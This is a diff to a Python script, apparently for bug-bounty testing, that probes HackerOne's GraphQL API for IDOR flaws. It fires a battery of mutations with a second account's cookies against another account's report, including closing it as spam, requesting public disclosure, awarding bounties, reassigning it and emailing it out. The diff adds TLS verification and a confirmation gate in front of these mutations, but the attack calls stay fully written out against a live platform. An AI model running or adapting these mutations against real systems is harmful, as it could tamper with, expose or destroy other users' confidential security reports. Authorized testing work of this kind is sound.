@@ -12,6 +12,7 @@ Usage:
 """
 
 import argparse
+import functools
 import json
 import ssl
 import urllib.request
@@ -22,13 +23,27 @@ import time
 
 BASE = "https://hackerone.com"
 
-def make_ctx():
+
+def make_ctx(insecure: bool = False):
+    """Build an SSL context.
+
+    By default certificate validation is ENABLED (hackerone.com serves a valid
+    public certificate, so no bypass is needed). The unverified path is only
+    reachable behind an explicit --insecure flag, which prints a loud warning,
+    because session cookies + CSRF tokens travel over this connection and an
+    on-path attacker could capture/replay them if TLS is not verified.
+    """
     ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
+    if insecure:
+        print(
+            "  [!! INSECURE !!] TLS certificate verification DISABLED "
+            "(--insecure) — session cookies are exposed to MITM."
+        )
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
     return ctx
 
-def get_csrf(cookie: str) -> str:
+def get_csrf(cookie: str, insecure: bool = False) -> str:
     req = urllib.request.Request(
         BASE,
         headers={
@@ -37,12 +52,13 @@ def get_csrf(cookie: str) -> str:
             "Accept": "text/html",
         },
     )
-    with urllib.request.urlopen(req, context=make_ctx(), timeout=15) as r:
+    with urllib.request.urlopen(req, context=make_ctx(insecure), timeout=15) as r:
         html = r.read().decode(errors="replace")
     m = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
     return m.group(1) if m else ""
 
-def gql(cookie: str, csrf: str, query: str, variables: dict = None) -> tuple[int, dict]:
+def gql(cookie: str, csrf: str, query: str, variables: dict = None,
+        insecure: bool = False) -> tuple[int, dict]:
     payload = {"query": query}
     if variables:
         payload["variables"] = variables
@@ -61,7 +77,7 @@ def gql(cookie: str, csrf: str, query: str, variables: dict = None) -> tuple[int
         method="POST",
     )
     try:
-        with urllib.request.urlopen(req, context=make_ctx(), timeout=15) as r:
+        with urllib.request.urlopen(req, context=make_ctx(insecure), timeout=15) as r:
             return r.status, json.loads(r.read())
     except urllib.error.HTTPError as e:
         try:
@@ -93,13 +109,58 @@ def check(label: str, status: int, resp: dict) -> bool:
         print(f"  data={json.dumps(data)[:200]}")
     return finding
 
+def _confirm_mutations(args, rid, gid) -> bool:
+    """Decide whether the destructive Phase 2 / Phase 5 mutations may fire.
+
+    Fail-CLOSED: state-changing mutations are SKIPPED unless --confirm-mutations
+    is supplied AND (in --dry-run mode is off) the operator types 'yes' after
+    seeing the resolved target. This catches a mistyped --report-gid before the
+    irreversible closeReport / requestPublicDisclosure / own-account changes.
+    """
+    if args.dry_run:
+        print("\n  [DRY-RUN] State-changing mutations will be PRINTED, not sent.")
+        return False
+    if not args.confirm_mutations:
+        print("\n  [SAFE]    State-changing mutations SKIPPED "
+              "(pass --confirm-mutations to enable). Read-only phases only.")
+        return False
+    print("\n  [!! DESTRUCTIVE !!] --confirm-mutations is set. These mutations")
+    print("  will FIRE against:")
+    print(f"      report-id : {rid}")
+    print(f"      report-gid: {gid}")
+    print("  Some are IRREVERSIBLE (closeReport / requestPublicDisclosure).")
+    try:
+        answer = input("  Type 'yes' to proceed: ").strip().lower()
+    except EOFError:
+        answer = ""
+    if answer != "yes":
+        print("  [ABORTED] Mutations not confirmed — running read-only phases only.")
+        return False
+    return True
+
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--cookie-a", required=True, help="Account A full cookie string")
     parser.add_argument("--cookie-b", required=True, help="Account B full cookie string")
     parser.add_argument("--report-id", required=True, help="Numeric report ID (Account A's)")
     parser.add_argument("--report-gid", required=True, help="Base64 GID of the report")
+    parser.add_argument("--insecure", action="store_true",
+                        help="Disable TLS certificate verification (DANGEROUS — "
+                             "exposes session cookies to MITM). Default: verify.")
+    parser.add_argument("--confirm-mutations", action="store_true",
+                        help="Enable the Phase 2/5 state-changing mutations "
+                             "(updateReportTitle, closeReport, awardBounty, ...). "
+                             "Off by default; requires an interactive 'yes'.")
+    parser.add_argument("--dry-run", action="store_true",
+                        help="Print state-changing mutations instead of sending them.")
     args = parser.parse_args()
+
+    insecure = args.insecure
+    # Bind the chosen TLS posture into the network helpers so every call site
+    # inherits it without threading the flag through manually.
+    _get_csrf = functools.partial(get_csrf, insecure=insecure)
+    gql = functools.partial(globals()["gql"], insecure=insecure)
 
     print("=" * 60)
     print("HackerOne Mutation IDOR Battery")
@@ -107,8 +168,8 @@ def main():
 
     # Get CSRF tokens
     print("\n[*] Getting CSRF tokens...")
-    csrf_a = get_csrf(args.cookie_a)
-    csrf_b = get_csrf(args.cookie_b)
+    csrf_a = _get_csrf(args.cookie_a)
+    csrf_b = _get_csrf(args.cookie_b)
     print(f"  A CSRF: {csrf_a[:20]}..." if csrf_a else "  A CSRF: FAILED")
     print(f"  B CSRF: {csrf_b[:20]}..." if csrf_b else "  B CSRF: FAILED")
 
@@ -159,36 +220,44 @@ def main():
     print("PHASE 2: State-changing mutations as Account B")
     print("=" * 60)
 
+    # Fail-closed gate: destructive mutations only fire behind explicit
+    # operator intent (--confirm-mutations + interactive 'yes').
+    do_mutations = _confirm_mutations(args, rid, gid)
+
+    def mutate(label: str, query: str):
+        """Run a state-changing mutation only if confirmed; otherwise show it."""
+        if not do_mutations:
+            print(f"\n  [SKIP] {label} (would fire; gated by --confirm-mutations)")
+            if args.dry_run:
+                print(f"  query={' '.join(query.split())[:300]}")
+            return
+        status, resp = gql(args.cookie_b, csrf_b, query)
+        if check(label, status, resp):
+            findings.append(label)
+        time.sleep(0.5)
+
     # updateReportTitle
-    q = f'''mutation {{
+    mutate("updateReportTitle as B", f'''mutation {{
       updateReportTitle(input: {{
         id: "{gid}"
         title: "TEST_IDOR_TITLE_DO_NOT_SUBMIT"
       }}) {{
         report {{ id title }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportTitle as B", status, resp):
-        findings.append("updateReportTitle")
-    time.sleep(0.5)
+    }}''')
 
     # updateReportVulnerabilityInformation
-    q = f'''mutation {{
+    mutate("updateReportVulnerabilityInformation as B", f'''mutation {{
       updateReportVulnerabilityInformation(input: {{
         id: "{gid}"
         vulnerability_information: "IDOR_TEST"
       }}) {{
         report {{ id vulnerability_information }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportVulnerabilityInformation as B", status, resp):
-        findings.append("updateReportVulnerabilityInformation")
-    time.sleep(0.5)
+    }}''')
 
     # addReportComment
-    q = f'''mutation {{
+    mutate("addReportComment as B", f'''mutation {{
       addReportComment(input: {{
         report_id: "{gid}"
         message: "IDOR_TEST_COMMENT_DO_NOT_ACCEPT"
@@ -196,65 +265,45 @@ def main():
       }}) {{
         activity {{ ... on ActivityComment {{ message }} }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("addReportComment as B", status, resp):
-        findings.append("addReportComment")
-    time.sleep(0.5)
+    }}''')
 
     # updateReportSeverity
-    q = f'''mutation {{
+    mutate("updateReportSeverity as B", f'''mutation {{
       updateReportSeverity(input: {{
         report_id: "{gid}"
         rating: "critical"
       }}) {{
         report {{ id severity {{ rating }} }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportSeverity as B", status, resp):
-        findings.append("updateReportSeverity")
-    time.sleep(0.5)
+    }}''')
 
     # updateReportStateToTriaged
-    q = f'''mutation {{
+    mutate("updateReportStateToTriaged as B", f'''mutation {{
       updateReportStateToTriaged(input: {{
         id: "{gid}"
       }}) {{
         report {{ id state }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportStateToTriaged as B", status, resp):
-        findings.append("updateReportStateToTriaged")
-    time.sleep(0.5)
+    }}''')
 
     # closeReport
-    q = f'''mutation {{
+    mutate("closeReport as B", f'''mutation {{
       closeReport(input: {{
         id: "{gid}"
         reason: "spam"
       }}) {{
         report {{ id state }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("closeReport as B", status, resp):
-        findings.append("closeReport")
-    time.sleep(0.5)
+    }}''')
 
     # requestPublicDisclosure
-    q = f'''mutation {{
+    mutate("requestPublicDisclosure as B", f'''mutation {{
       requestPublicDisclosure(input: {{
         id: "{gid}"
       }}) {{
         report {{ id }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("requestPublicDisclosure as B", status, resp):
-        findings.append("requestPublicDisclosure")
-    time.sleep(0.5)
+    }}''')
 
     print("\n" + "=" * 60)
     print("PHASE 3: Attachment / file access as Account B")
@@ -314,7 +363,7 @@ def main():
     print("=" * 60)
 
     # awardBounty on A's report
-    q = f'''mutation {{
+    mutate("awardBounty as B on A's report", f'''mutation {{
       awardBounty(input: {{
         report_id: "{gid}"
         amount: 1
@@ -323,28 +372,20 @@ def main():
       }}) {{
         bounty {{ amount }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("awardBounty as B on A's report", status, resp):
-        findings.append("awardBounty")
-    time.sleep(0.5)
+    }}''')
 
     # assignReport
-    q = f'''mutation {{
+    mutate("assignReport as B", f'''mutation {{
       assignReport(input: {{
         report_id: "{gid}"
         assignee_id: "4378355"
       }}) {{
         report {{ id assignee {{ username }} }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("assignReport as B", status, resp):
-        findings.append("assignReport")
-    time.sleep(0.5)
+    }}''')
 
     # shareReportViaEmail
-    q = f'''mutation {{
+    mutate("shareReportViaEmail as B", f'''mutation {{
       shareReportViaEmail(input: {{
         id: "{gid}"
         email: "awarexone@example.com"
@@ -352,11 +393,7 @@ def main():
       }}) {{
         report {{ id }}
       }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("shareReportViaEmail as B", status, resp):
-        findings.append("shareReportViaEmail")
-    time.sleep(0.5)
+    }}''')
 
     print("\n" + "=" * 60)
     print("SUMMARY")
